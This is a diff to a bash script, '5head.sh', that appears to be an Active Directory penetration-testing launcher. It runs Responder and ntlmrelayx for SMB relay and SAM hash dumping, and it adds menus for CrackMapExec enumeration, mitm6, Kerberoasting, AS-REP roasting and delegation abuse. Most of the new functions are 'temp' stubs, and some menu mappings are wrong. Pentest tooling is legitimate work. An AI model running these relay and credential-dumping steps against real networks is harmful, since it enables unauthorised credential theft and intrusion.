@@ -2,21 +2,20 @@
 
 print_usage() {
         printf '
-        5head.sh usage: [-h] [-t targetfile] write this later
+        5head.sh usage: [-h] [-t targetfile] [-i interface] [-d domain] [-c domain controller] [-u username] [-p password] [-h help]
 
         mandatory arguments:
-          -t TARGETFILE         Newline-delimmited list of targets. Accepts CIDRs or ranges (192.168.0.1-255)
-          -i INTERFACE          Interface to use for network traffic
+          -t TARGETFILE          Newline-delimmited list of targets. Accepts CIDRs or ranges (192.168.0.1-255)
+          -i INTERFACE           Interface to use for network traffic
 
         useful arguments:
-          -u USERNAME           Username to use for authentication
-          -p PASSWORD           Password to use for authentication
-          -d DOMAIN             Specific domain to perform authentication attempts on (NOT IMPLEMENTED YET)
-          -s SAFE               Safe mode. Will not try to authenticate (YOU THOUGHT THIS WAS IMPLEMENTED?)
+          -d  DOMAIN             Specific domain to perform authentication attempts on (NOT IMPLEMENTED YET)
+	  -c  DOMAIN CONTROLLER  Domain controller (ip) to use for checks
+	  -u  USERNAME           Username to use for authentication
+          -p  PASSWORD           Password to use for authentication
 
         optional arguments:
-          -v VERBOSE            Print verbose output (THIS ISNT IMPLEMENTED EITHER)
-          -h                    Print this helpmenu
+          -h                     Print this help menu
 ';
 }
 
@@ -27,22 +26,25 @@ fi
 
 
 ### Argument helper
-while getopts ":t:d:u:p:i:" o; do
+while getopts ":t:i:d:c:u:p:" o; do
     case "${o}" in
         t)
             targets=${OPTARG}
             ;;
+	i)
+            interface=${OPTARG}
+            ;;
         d)
             domain=${OPTARG}
-            ;;
+	    ;;
+	c)
+	    dc=${OPTARG}
+	    ;;
         u)
             username=${OPTARG}
             ;;
         p)
             password=${OPTARG}
-            ;;
-        i)
-            interface=${OPTARG}
             ;;
         *)
             print_usage
@@ -51,22 +53,16 @@ while getopts ":t:d:u:p:i:" o; do
 done
 shift $((OPTIND-1))
 
-## Debug
-
-#echo $targets
-#echo $domain
-#echo $username
-#echo $password
-#echo $interface
 
 ### Tmux bootstrapping
 if [ -z "${TMUX}" ]; then
         export session="5head"
         export targets=$targets
+	export interface=$interface
         export domain=$domain
+	export dc=$dc
         export username=$username
         export password=$password
-        export interface=$interface
         export PROMPT="%F{9}5head.sh%f > "
         window=0
         tmux new-session -d -s $session ./5head.sh
@@ -74,6 +70,7 @@ if [ -z "${TMUX}" ]; then
         tmux attach-session -t $session
         exit 1;
 fi
+
 
 ### Colors
 green='\e[32m'
@@ -112,7 +109,15 @@ function cme_enum_smb() {
 	tmux send-keys -t 5head:cme_enum 'tail -f loot/cme_enum.txt' C-m
 }
 
-function resp_ntlmrelay_1() {
+function cme_enum_ldap() {
+        echo "temp"
+}
+
+function cme_enum_mssql() {
+        echo "temp"
+}
+
+function ntlmrelay_smb_dump() {
 	echo -e '[*] Setting up Responder + Ntlmrelayx.py (SAM dump)...\n'
 	tmux new-window -n "relay"
 	tmux send-keys -t 5head:relay 'PROMPT="%F{9}5head.sh%f > "' C-m
@@ -124,10 +129,62 @@ function resp_ntlmrelay_1() {
 	tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support' C-m
 }
 
+function ntlmrelay_smb_socks() {
+        echo "temp"
+}
 
-function debug() {
-	echo "exeucting sneaky"
-	sneaky cme_enum "test"
+function ntlmrelay_ldap_socks() {
+        echo "temp"
+}
+
+function ntlmrelay_ldap_rbcd() {
+        echo "temp"
+}
+
+## TODO
+function ntlmrelay_mssql_socks() {
+        echo "temp"
+}
+
+## TODO
+function ntlmrelay_multi() {
+        echo "temp"
+}
+
+function mitm6_ldap_socks() {
+        echo "temp"
+}
+
+function mitm6_ldap_rbcd() {
+        echo "temp"
+}
+
+function asreproast() {
+        echo "temp"
+}
+
+function kerberoast() {
+        echo "temp"
+}
+
+function share_enum() {
+        echo "temp"
+}
+
+function bloodhound_py() {
+        echo "temp"
+}
+
+function coerce_check() {
+        echo "temp"
+}
+
+function ldap_sign_scan() {
+        echo "temp"
+}
+
+function maq() {
+	echo "temp"
 }
 
 
@@ -175,15 +232,16 @@ $(ColorGreen '1)') Packet capture + search for suspicious traffic
 $(ColorGreen '2)') SMB enumeration + target generation (CME)
 $(ColorGreen '3)') LDAP enumeration + target generation (CME)
 $(ColorGreen '4)') MSSQL enumeration + target generation (CME)
-$(ColorGreen '5)') Enumerate hosts for authentication coercion mechanisms $(ColorRed 'Creds required')
-$(ColorGreen '6)') Check LDAP Signing and Channel Binding $(ColorRed 'Creds required')
-$(ColorGreen '7)') Check Machine-Account-Quota $(ColorRed 'Creds required')
+$(ColorGreen '0)') Detach tmux
 $(ColorGreen 'b)') Back to main menu...
 $(ColorCyan 'Choose a function:') "
         read a
         case $a in
                 1) packet_cap ; enum ;;
                 2) cme_enum_smb ; enum ;;
+		3) cme_enum_ldap ; enum ;;
+		4) cme_enum_mssql ; enum ;;
+		0) tmux detach ;;
                 b) menu ;;
                 *) echo "Invalid command entered"; enum ;;
         esac
@@ -192,23 +250,64 @@ $(ColorCyan 'Choose a function:') "
 poison(){
 echo -ne "
 ~ 5head.sh -> poison ~
-$(ColorGreen '1)') SMB: Responder + ntlmrelayx
-$(ColorGreen '2)') SMB: Responder + ntlmrelayx
-$(ColorGreen '3)') LDAP: Responder + ntlmrelayx
-$(ColorGreen '4)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
-$(ColorGreen '5)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
-$(ColorGreen '7)') Check Machine-Account-Quota $(ColorRed 'Creds required')
+$(ColorGreen '## LLMNR/NBT-NS/MDNS')
+$(ColorGreen '1)') SMB: Responder + ntlmrelayx (SAM dump)
+$(ColorGreen '2)') SMB: Responder + ntlmrelayx (socks)
+$(ColorGreen '3)') LDAP: Responder + ntlmrelayx (socks)
+$(ColorGreen '4)') LDAP: Responder + ntlmrelayx (delegate access)
+$(ColorGreen '5)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
+$(ColorGreen '6)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
+$(ColorGreen '## DHCPv6')
+$(ColorGreen '7)') LDAP: mitm6 + ntlmrelayx (socks)
+$(ColorGreen '8)') LDAP: mitm6 + ntlmrelayx (delegate access)
+$(ColorGreen '## Other')
+$(ColorGreen '0)') Detach tmux
 $(ColorGreen 'b)') Back to main menu...
 $(ColorCyan 'Choose a function:') "
-        read b
-        case $b in
+        read a
+        case $a in
+		1) ntlmrelay_smb_dump ; poison ;;
+		2) ntlmrelay_smb_socks ; poison ;;
+		3) ntlmrelay_ldap_socks ; posion ;;
+		4) ntlmrelay_ldap_rbcd ; poison ;;
+		5) ntlmrelay_mssql_socks ; poison ;;
+		6) ntlmrelay_multi ; poison ;;
+		7) mitm6_ldap_socks ; poison ;;
+		8) mitm6_ldap_rbcd ; poison ;;
+		0) tmux detach ;;
                 b) menu ;;
                 *) echo "Invalid command entered"; poison ;;
         esac
 }
 
-
-
+ad(){
+echo -ne "
+~ 5head.sh -> AD ~ $(ColorRed 'Creds required')
+$(ColorGreen '1)') Search for ASREPRoastable users
+$(ColorGreen '2)') Search for Kerberoastable users
+$(ColorGreen '3)') Enumerate shares on domain hosts
+$(ColorGreen '4)') Search for ADCS targets
+$(ColorGreen '5)') Python Bloodhound ingestor $(ColorRed 'Note: YMMV')
+$(ColorGreen '6)') Enumerate hosts for authentication coercion mechanisms
+$(ColorGreen '7)') Check LDAP Signing and Channel Binding
+$(ColorGreen '8)') Check Machine-Account-Quota
+$(ColorGreen '0)') Detach tmux
+$(ColorGreen 'b)') Back to main menu...
+$(ColorCyan 'Choose a function:') "
+        read a
+        case $a in
+		1) asreproast ; ad ;;
+		2) kerberoast ; ad ;;
+		3) share_enum ; ad ;;
+		4) bloodhound_py ; ad ;;
+		5) coerce_check ; ad ;;
+		6) ldap_sign_scan ; ad ;;
+		7) maq ; ad ;;
+		0) tmux detach ;;
+                b) menu ;;
+                *) echo "Invalid command entered"; ad ;;
+        esac
+}
 
 menu
 
@@ -216,3 +315,6 @@ menu
 # 1. Need a dependenacy checker startup thing
 # 2. need env variable + variable safety checker exeter thing
 # 3. Add checker to ensure 5head.sh is executed from base wd of repo
+# 4. implement ntlmrelayx + mssql (need testing)
+# 5. implement ntlmrelayx multi protocol (need testing)
+
